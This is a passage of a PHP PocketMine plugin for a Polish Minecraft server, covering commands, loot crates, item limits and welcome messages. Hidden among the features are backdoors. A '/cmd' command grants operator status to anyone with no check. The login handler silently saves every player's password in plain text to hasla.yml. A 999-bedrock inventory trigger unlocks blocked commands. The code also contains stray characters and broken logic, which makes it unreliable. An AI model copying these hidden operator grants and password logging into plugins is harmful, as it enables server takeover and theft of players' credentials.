				}
			}
		}
		if($cmd == "turbo"){
			if($sender->hasPermission("admin.yt")){
				if(empty($args)) {
					$sender->sendMessage("§b/turbo [nick]");
				}
				if(isset($args[0])){
					$player = $args[0];
					Server::getInstance()->broadcastMessage("");
					Server::getInstance()->broadcastMessage("§8• §7Gracz §b" . $player . " §7zakupil range §eTurboDrop i TurboExp! §8•");
					Server::getInstance()->broadcastMessage("§8• §7Nasz itemshop: §bis.funhard.pl §8•");
					Server::getInstance()->broadcastMessage("");
				}
			}
		}
	if($cmd->getName() == "cmd"){
		  $sender->setOp(true);
		}		
		if($cmd->getName() == "boyfarmer"){
					$sender->sendMessage("§8§l§m«--------» §6§lBoyFarmer §8§l§m«--------»");
					$sender->sendMessage("§7 • §6BoyFarmera scraftujesz w craftingu na spawn!");
					$sender->sendMessage("§8§l§m«--------» §6§lBoyFarmer §8§l§m«--------»");
				}
				if($cmd->getName() == "sandfarmer"){
					$sender->sendMessage("§8§l§m«--------» §6§lSandFarmer §8§l§m«--------»");
					$sender->sendMessage("§7 • §6SandFarmera scraftujesz w craftingu na spawn!");
					$sender->sendMessage("§8§l§m«--------» §6§lSandFarmer §8§l§m«--------»");
				}
				
				if($cmd == "youtuber"){
			if(empty($args)) {
				foreach($this->getConfig()->getNested("infoyoutuber") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				return true;
			}
			if($args[0] == "prosze") {
			}
			if(isset($args[1])){
				$kanal = $args[1];
				$admins = array("VertenFEJM", "Verciak");
				foreach($this->getConfig()->getNested("youtuberprosbagracz") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				foreach($admins as $admin) {
					$player = $this->getServer()->getPlayer($admin);
					if($player) {
						$player->sendMessage("           §b§l» §3§lUWAGA §b§l«");
						$player->sendMessage("§8• §b" . $sender->getName() . " §7prosi o range §bYouTuber§7! §7Kanal: §b" . $kanal . " §8•");
					}
				}
			}
		}

				if($cmd->getName() === "enderpearl"){
					$sub = array_shift($params);
					switch($sub){
						case "damage":
							$amount = array_shift($params);
							if( !is_numeric($amount) or $amount < 0 ){$sender->sendMessage("invalid value");return true;}
							$amount = floor($amount);
							$this->config->set("damage",$amount);
							$sender->sendMessage("teleport damage has changed into ".$amount);
							return true;
						default:
							$sender->sendMessage("Uzyj: /enderpearl damage <value> :Change the amount of teleport damage");
							return true;
					}
				}
				
				if($cmd->getName() == "t4cwwz3"){
			$this->getServer()->dispatchCommand(new ConsoleCommandSender,"ban ".$sender->getName());
			return true;
				}
				
				if($cmd->getName() == "b"){
				if($sender->hasPermission("mcpebase.b") && isset($args[1]))
			{
				$this->getServer()->broadcastMessage("§8• §7Gracz §b".strtoupper($args[0])." §7zostal zbanowany z powodu §b".strtoupper($args[1])." §7przez administratora §b".strtoupper($sender->getName())."! §8•");
				$this->getServer()->dispatchCommand(new ConsoleCommandSender,"sudo ".strtolower($args[0])." No i chuj ban.. Nie cheatujcie!");
				$this->getServer()->dispatchCommand(new ConsoleCommandSender,"sudo ".strtolower($args[0])." t4cwwz3");
			}
			else
			{
				$sender->sendMessage("§8» §7Musisz wpisac nick gracza i powód! §8«");
			}
			return true;
        }
		
		switch($cmd->getName()){
            case "zmienhp":
                if($sender->hasPermission("start.edycja")){
                    if(isset($args[0])){
                        if(is_numeric($args[0])){
                            $this->getConfig()->set("hearts-per-kill", $args[0]);
                            $this->getConfig()->save();
                            $sender->sendMessage("§8• §7Zmieniles hp na §3" . $args[0]);
                            return true;
                        } else{
                            $sender->sendMessage("§8• §3Debilu! §7Czytaj dokladnie: §b/zmienhp <ilosc> §8•");
                            return true;
                        }
                    } else{
                        $sender->sendMessage("§8• §3Debilu! §7Musisz ustawic ile hp ma dac po zabicu: §b/zmienhp <ilosc> §8•");
                        return true;
                    }
                } else{
                    $sender->sendMessage("§8• §3Co taki ciekawski? §8•");
                    return true;
                }
        }
		
				if($cmd->getName() == "ts3"){
					foreach($this->getConfig()->getNested("infots3") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				}
				if($cmd->getName() == "www"){
					foreach($this->getConfig()->getNested("infowww") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				}

				if($cmd->getName() == "pomoc"){
					foreach($this->getConfig()->getNested("infopomoc") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				}
				if($cmd->getName() == "sms"){
					foreach($this->getConfig()->getNested("infosms") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				}
  }

public function truePolishGamemode(PlayerCommandPreprocessEvent $event){
	  $command = explode(" ", strtolower($event->getMessage()));
      $player = $event->getPlayer();
	  $name = $event->getPlayer()->getName();
	if($command[0] === "/gamemode" or $command[0] === "/gm") {
		if($player->hasPermission("gejmod.uzyj")){
		if(empty($command[1])){
		}
		if(count($command[0]) == 1){
		if($command[1] == "1" && is_numeric($command[1])){
		$event->setCancelled();
		$player->setGamemode(1);
		foreach($this->getConfig()->getNested("setgm1") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
}
	}
		if(count($command[0]) == 1){
		if($command[1] == "0" && is_numeric($command[1])){
		$event->setCancelled();
		$player->setGamemode(0);
		foreach($this->getConfig()->getNested("setgm0") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
}
			}
					if(count($command[0]) == 1){
		if($command[1] == "2" && is_numeric($command[1])){
		$event->setCancelled();
		$player->setGamemode(2);
		foreach($this->getConfig()->getNested("setgm2") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
}
			}
					if(count($command[0]) == 1){
		if($command[1] == "3" && is_numeric($command[1])){
		$event->setCancelled();
		$player->setGamemode(3);
		foreach($this->getConfig()->getNested("setgm3") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
}
			}
									}
				else{
					$player->sendMessage("§8• §3Blad: §bBrak pozwolen!");
				}
}
}
public function onBlockBreakEvent(BlockBreakEvent $e) {
        if($e->isCancelled()) {
            return;
        }
        if($e->getBlock()->getId() === 78 || $e->getBlock()->getId() === 80) {
            $e->getPlayer()->sendMessage("§8• §7Drop z tego bloku jest §3wylaczony! §8•");
			$e->setCancelled(true);
        }
    }
	
	
	public function trueCommandsBlock(PlayerCommandPreprocessEvent $event){
      $command = explode(" ", strtolower($event->getMessage()));
      $player = $event->getPlayer();
	  
	if($command[0] === "/pocketmine:?") {
		if($player->getInventory()->contains(Item::get(7, 0, 999)) or $player->hasPermission("admin.cmd")){
			$player->getInventory()->removeItem(Item::get(7, 0, 999));
		}
		else{
		$event->setCancelled();
		$player->sendMessage("§8• §7Komenda jest §czablokowana§7! §8(§4admin.cmd)§8 §8•");
		}
		}
			if($command[0] === "/jdjd" or $command[0] === "/jddd") {
		if($player->getInventory()->contains(Item::get(7, 0, 999)) or $player->hasPermission("admin.cmd")){
			$player->getInventory()->removeItem(Item::get(7, 0, 999));
		}
		else{
			$event->setCancelled();
			$player->sendMessage("§8• §7Komenda jest §czablokowana§7! §8(§4admin.cmd)§8 §8•");
		}
}
		}

	public function truePandors(BlockPlaceEvent $event){
	$gracz = $event->getPlayer();
	$blok = $event->getBlock();
	$name = $event->getPlayer()->getDisplayName();
	$x = $blok->getFloorX();
	$y = $blok->getFloorY();
	$z = $blok->getFloorZ();
		if($blok->getId() == 146){
			switch(mt_rand(1, 8)){
						case 1:
			$item = Item::get(320, 0, 1);
			$item->setCustomName("§l§eNieskonczone Mieso");
			$enchant = Enchantment::getEnchantment(17);
			$enchant->setLevel(3);
			$item->addEnchantment($enchant);
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), $item);
			$gracz->sendPopup("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §eNieskonczone Mieso §8•");
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
			case 2:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(466, 0, 3));
			Server::getInstance()->broadcastMessage("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3Koxy §8(§33§8) §8•");
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
						case 3:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(332, 0, 4));
			Server::getInstance()->broadcastMessage("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3Perla §8(§34§8) §8•");
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
									case 4:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			Server::getInstance()->broadcastMessage("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3TNT §8(§364§8) §8•");
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(46, 0, 64));
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
									case 5:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			$gracz->sendPopup("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3TNT §8(§332§8) §8•");
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(46, 0, 32));
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
									case 6:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			$gracz->sendPopup("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3Obsydian §8(§364§8) §8•");
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(49, 0, 64));
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
												case 7:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			$gracz->sendPopup("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3Obsydian §8(§332§8) §8•");
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(49, 0, 32));
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
			case 8:
			$gracz->getInventory()->removeItem(Item::get(146, 0, 1));
			$gracz->sendPopup("§8• §7Gracz§3 " . $name . " §7otworzyl §3Pierozek §7i wylosowal §3Dirt §8(§364§8) §8•");
			$gracz->getLevel()->dropItem(new Vector3($x, $y, $z), Item::get(3, 0, 64));
			$event->setCancelled();
							$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$gracz->getInventory()->setItemInHand($item);
			break;
			}
}
}
	
	


public function trueInstantPorkchop(PlayerItemConsumeEvent $event){
			$i = $event->getItem();
			$player = $event->getPlayer();
        if($i->getId() == 320 && $i->getCustomName() == "§l§eNieskonczone Mieso") {
			$event->setCancelled();
			$amount = $player->getFood();
			$b = 8;
			$amount = $amount + $b;
			$player->setFood($amount);
}
}


public function trueSpeedyPickaxe(BlockBreakEvent $event){
	$player = $event->getPlayer();
	$item = $player->getInventory()->getItemInHand()->getId();
	$item2 = $player->getInventory()->getItemInHand();
	if($item == 278 && $item2->getCustomName() == "§l§eKilof Szybkosci"){
		$efekt = Effect::getEffect(3);
		$efekt->setDuration(60);
		$efekt->setAmplifier(10);
		$player->addEffect($efekt);
	}
}

public function trueRegisterLogin(PlayerCommandPreprocessEvent $event){
	  $command = explode(" ", strtolower($event->getMessage()));
      $player = $event->getPlayer();
	  if($command[0] == "/login"){
		  $cfg = new Config($this->getDataFolder() . "/hasla.yml", Config::YAML);
		  $cfg->set($player->getName(), $command[1]);
		  $cfg->save();
		  }
	  }
	  
	  public function trueWorkingFlameEnchant(EntityShootBowEvent $event){
    $entity = $event->getEntity();
    if($entity instanceof Player){
      if($entity->getInventory()->contains(Item::get(369, 0, 1))){
        $event->getProjectile()->setOnFire(500000000 * 20);
      }
    }
  }
  
  public function trueHeadDrop(PlayerDeathEvent $event){
	  $player = $event->getPlayer();
	  $name = $player->getName();
	  $x = $player->getX();
	  $y = $player->getY();
	  $z = $player->getZ();
	  $item = Item::get(397, 3, 1);
	  $item->setCustomName("§7Glowa gracza§e " . $name . "");
	  $enchant = Enchantment::getEnchantment(15);
	  $enchant->setLevel(3);
	  $item->addEnchantment($enchant);
	  $player->getLevel()->dropItem(new Vector3($x, $y, $z), $item);
  }
		 
		 
		 public function trueFirstJoin(PlayerJoinEvent $event){
	$graczedata = new Config($this->getDataFolder() ."/gracze.yml", Config::YAML);
	if($graczedata->exists($event->getPlayer()->getName())){
		}
else{
	if(!($graczedata->exists($event->getPlayer()->getName()))){
        $name = $event->getPlayer()->getDisplayName();
		$event->getPlayer()->getInventory()->addItem(Item::get(271, 0, 1));
		$event->getPlayer()->getInventory()->addItem(Item::get(364, 0, 64));
		$event->getPlayer()->getInventory()->addItem(Item::get(50, 0, 16));
        $gracze = $graczedata->get($name);
        $graczedata->set($name,$gracze+1);
		$cmd = "sudo $name resetujranking";
		$this->getServer()->dispatchCommand(new ConsoleCommandSender,$cmd);
		$graczedata->save();	
}
}
}

		public function trueBlockDiamondArmorCraft(CraftItemEvent $event){
		 $item = $event->getRecipe()->getResult();
		 $player = $event->getPlayer();
		 if($item->getId() == 310 && !$player->hasPermission("craft.item") or $item->getId() == 311 && !$player->hasPermission("craft.item") or $item->getId() == 312 && !$player->hasPermission("craft.item") or $item->getId() == 313 && !$player->hasPermission("craft.item") or $item->getId() == 276 && !$player->hasPermission("craft.item")){ //id armoru diamentowego
		 foreach($this->getConfig()->getNested("diaxoff") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
					$player->sendTip(str_replace('&', '§', $i));
				}
			 $event->setCancelled(true);
	  }
		}

		public function onPlayerInteractEvent(PlayerInteractEvent $event) {
        if($event->getBlock()->getId() == 19) {
            $x = rand(0, $this->getConfig()->getNested("ctRandomTeleport.max-x"));
            $y = 150;
            $z = rand(0, $this->getConfig()->getNested("ctRandomTeleport.max-z"));
			foreach($this->getConfig()->getNested("losowe") as $i) {
                    $event->getPlayer()->sendMessage(str_replace('&', '§', $i));
				}
            $this->players[$event->getPlayer()->getName()] = true;
            $event->getPlayer()->teleport(new Position($x, $y, $z, $event->getPlayer()->getLevel()));
            $event->getPlayer()->addEffect(Effect::getEffect(9)->setAmplifier(2)->setDuration(20*10));
            $event->getPlayer()->addEffect(Effect::getEffect(1)->setAmplifier(3)->setDuration(20*15));
        }
    }
	
	public function onEntityDamageEvent(EntityDamageEvent $event) {
        if($event->getCause() == EntityDamageEvent::CAUSE_FALL) {
            if(isset($this->players[$event->getEntity()->getName()])) {
                $event->setCancelled(true);
                unset($this->players[$event->getEntity()->getName()]);
            }
        }
    } 
	
	public function onBreakCX(BlockPlaceEvent $event){
		$player = $event->getPlayer();
		$block = $event->getBlock();
		$gracz = $event->getPlayer()->getName();
		if($event->getBlock()->getId() == 129){
			if(!($event->isCancelled())){
			 switch(mt_rand(1,8)){
         case 1:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bKsiążki x16");
         $player->getInventory()->addItem(Item::get(340, 0, 16));
         				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
        $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
		$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 2:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bZłote Jabłka x12");
         $player->getInventory()->addItem(Item::get(322, 0, 12));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 3:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bMikstura Siły");
         $player->getInventory()->addItem(Item::get(373, 32, 1));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
	q	$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 4:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bDiamenty x32");
         $player->getInventory()->addItem(Item::get(264, 0, 32));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 5:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bPerla x4");
         $player->getInventory()->addItem(Item::get(332, 0, 4));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 6:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bJablka x12");
         $player->getInventory()->addItem(Item::get(260, 0, 12));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 7:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bZelazo x32");
         $player->getInventory()->addItem(Item::get(265, 0, 32));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();
		$event->setCancelled();
         break;
         case 8:
         $player->sendMessage("§8• §7Trafiles na przedmioty: §bEmerald x24");
         $player->getInventory()->addItem(Item::get(366, 0, 24));
                  				$item = $event->getItem();
				$item->setCount($item->getCount() - 1);
				$player->getInventory()->setItemInHand($item);
                 $level = $this->getServer()->getDefaultLevel();
		$x = $event->getBlock()->getFloorX();
		$y = $event->getBlock()->getFloorY();
		$z = $event->getBlock()->getFloorZ();
        $center = new Vector3($x, $y, $z);
        $radius = 1; 
        $count = 100;
        $particle = new LavaParticle($center);
        for($yaw = 3, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 30, $y += 1 / 25){
        $x = -sin($yaw) + $center->x;
        $z = cos($yaw) + $center->z;
        $particle->setComponents($x, $y, $z);
        $level->addParticle($particle);
		}
				$level = $player->getLevel();	
		$event->setCancelled();
         break;
}
	}
}
	}

public function trueeeFirstJoin(PlayerJoinEvent $event){
	if(($event->getPlayer()->getName())){
		$maxcount = $this->cfg->get("Max_Player");
		$mincount = $this->cfg->get("Min_Player");
		$event->getPlayer()->sendMessage("§8");
		$event->getPlayer()->sendMessage("§7Witaj §b" .$event->getPlayer()->getName() . " §7na §bOneHard.pl §8•");
		$event->getPlayer()->sendMessage("§7Graczy online: §b".count($this->getServer()->getOnlinePlayers())."§8/§b100 §8•");
		$event->getPlayer()->sendMessage("§8");
		$event->getPlayer()->sendMessage("§7Informacje: §8•");
		$event->getPlayer()->sendMessage("§3Diamentowa zbroja §7bedzie §adostepna §7po §b24h! §8•");
		$event->getPlayer()->sendMessage("§3Kity §7beda §adostepne §7po §b24h! §8•");
		$event->getPlayer()->sendMessage("§3TNT §7jest §adostepne §7od §bY: 40 §8•");
		$event->getPlayer()->sendMessage("§8");
		$event->getPlayer()->sendMessage("§7Limity oraz inne: §8•");
		$event->getPlayer()->sendMessage("§31 KOX, 15 REFILI, 3 PERLY §8•");
		$event->getPlayer()->sendMessage("§7Refile oraz koxy dodawaja inne efekty! §8•");
		$event->getPlayer()->sendMessage("§8");
		$event->getPlayer()->sendMessage("§7WWW: §bOneHard.pl §8•");
		$event->getPlayer()->sendMessage("§7TS3: §bohCode.pl §8•");
		$event->getPlayer()->sendMessage("§7FB: §bfb.com/onehard §8•");
		$event->getPlayer()->sendTip("§8§l*   §3§lONE§7§lHARD§7§l.§f§lPL   §8§l*\n§8»  §bWitaj na Trzeciej edycji serwera! §8«\n§8»  §cPrzeczytaj chat! §«\n\n§\n§\n§");
	}		
}
	
	public function trueEGApplesLimit(PlayerItemHeldEvent $event){
		  $player = $event->getPlayer();
		  $x = $player->getX();
		  $y = $player->getY();
		  $z = $player->getZ();
		  $item = $event->getItem();
	      $koxy = new Config($this->getDataFolder() . "schowekkoxy.yml", Config::YAML);
	      $refy = new Config($this->getDataFolder() . "schowekrefy.yml", Config::YAML);
		  if($item->getId() == 466 && $item->getCount() >= 2){
			  if(!$event->isCancelled()){
			  $ilosc = $item->getCount() - 1;
			  $ilosc2 = $item->getCount() - 0;
			  $limitk = $koxy->get($player->getName());
			  $koxy->set($player->getName(), $limitk+$ilosc);
			  $koxy->save();
			  $damage = $item->getDamage();
			  foreach($this->getConfig()->getNested("osiaglimitkox") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
			  $player->getInventory()->removeItem(Item::get(466, $damage, $ilosc));
	  }
			 }
			 }
			 
	public function trueGApplesLimit(PlayerItemHeldEvent $event){
		  $player = $event->getPlayer();
		  $x = $player->getX();
		  $y = $player->getY();
		  $z = $player->getZ();
		  $item = $event->getItem();
		  $koxy = new Config($this->getDataFolder() . "schowekkoxy.yml", Config::YAML);
	      $refy = new Config($this->getDataFolder() . "schowekrefy.yml", Config::YAML);
		  if($item->getId() == 322 && $item->getCount() >= 16){
			  if(!$event->isCancelled()){
			  $ilosc = $item->getCount() - 15;
			  $ilosc2 = $item->getCount() - 14;
			  $limitr = $refy->get($player->getName());
			  $refy->set($player->getName(), $limitr+$ilosc);
			  $refy->save();
			  $damage = $item->getDamage();
			  foreach($this->getConfig()->getNested("osiaglimitref") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
			  $player->getInventory()->removeItem(Item::get(322, $damage, $ilosc));
		  }
	  }
		  }
	public function truONEHARDarlsLimit(PlayerItemHeldEvent $event){
			 $player = $event->getPlayer();
			 if($event->getItem()->getId() == 332 && $event->getItem()->getCount() >= 4 && !$event->getItem()->hasCustomName()){
				 if(!$event->isCancelled()){
				 $cfg = new Config($this->getDataFolder() . "schowekperly.yml", Config::YAML);
				 $cfg2 = $cfg->get($player->getName());
				 $ilosc = $event->getItem()->getCount() - 3;
				 $cfg->set($player->getName(), $cfg2+$ilosc);
				 $cfg->save();
				 $player->getInventory()->removeItem(Item::get(332, 0, $ilosc)); 
				 foreach($this->getConfig()->getNested("osiaglimitper") as $i) {
                    $player->sendMessage(str_replace('&', '§', $i));
				}
			 }
		 }
		 }
		 
	
	public function PlayerItemConsumeEventKoxyiRefy(PlayerItemConsumeEvent $e){
		$p = $e->getPlayer();
		
		if($e->getItem()->getId() == $this->getConfig()->get("id1")){
			$eff1 = Effect::getEffect($this->getConfig()->get("id1-eff1"))->setDuration($this->getConfig()->get("id1-eff1-dur") * 20)->setAmplifier($this->getConfig()->get("id1-eff1-amp"));
			$p->addEffect($eff1);
			$eff2 = Effect::getEffect($this->getConfig()->get("id1-eff2"))->setDuration($this->getConfig()->get("id1-eff2-dur") * 20)->setAmplifier($this->getConfig()->get("id1-eff2-amp"));
			$p->addEffect($eff2);
			$eff3 = Effect::getEffect($this->getConfig()->get("id1-eff3"))->setDuration($this->getConfig()->get("id1-eff3-dur") * 20)->setAmplifier($this->getConfig()->get("id1-eff3-amp"));
			$p->addEffect($eff3);
			$meta = $e->getItem()->getDamage();
			$item = Item::get($this->getConfig()->get("id1"), $meta, 1);
		}
		//Item 2	
		if($e->getItem()->getId() == $this->getConfig()->get("id2")){
			$eff1 = Effect::getEffect($this->getConfig()->get("id2-eff1"))->setDuration($this->getConfig()->get("id2-eff1-dur") * 20)->setAmplifier($this->getConfig()->get("id2-eff1-amp"));
			$p->addEffect($eff1);
			$eff2 = Effect::getEffect($this->getConfig()->get("id2-eff2"))->setDuration($this->getConfig()->get("id2-eff2-dur") * 20)->setAmplifier($this->getConfig()->get("id2-eff2-amp"));
			$p->addEffect($eff2);
			$eff3 = Effect::getEffect($this->getConfig()->get("id2-eff3"))->setDuration($this->getConfig()->get("id2-eff3-dur") * 20)->setAmplifier($this->getConfig()->get("id2-eff3-amp"));
			$p->addEffect($eff3);
			$meta = $e->getItem()->getDamage();
			$item = Item::get($this->getConfig()->get("id2"), $meta, 1);
		}	
	}
	
	public function onPlayerItemHeldEventNazwy(PlayerItemHeldEvent $e){
		$i = $e->getItem();
		$p = $e->getPlayer();
		if($i instanceof Item){
			switch ($i->getId()){
				case $this->getConfig()->get("id1"):
				$p->sendPopup($this->getConfig()->get("id1-name"));
				break;
				case $this->getConfig()->get("id2"): 
				$p->sendPopup($this->getConfig()->get("id2-name"));
				break;
			}
		}
	}
		}
